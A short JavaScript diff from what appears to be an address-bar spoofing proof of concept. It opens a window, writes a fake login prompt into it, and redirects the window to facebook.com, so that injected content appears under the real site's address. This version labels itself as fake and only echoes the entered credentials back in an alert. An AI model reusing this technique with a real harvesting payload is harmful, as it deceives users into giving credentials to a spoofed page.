@@ -5,7 +5,12 @@
 
   function f() {
     w = window.open("");
-    w.document.write('%3Cscript%3Eprompt(%22Sign%20into%20your%20account%20in%20order%20to%20access%20google.com%22%2C%20%22E-mail%20%2F%20Password');
+    w.document.write(`<h1>This is not Facebook!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>`);
     w.location = "https://facebook.com";
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
   }
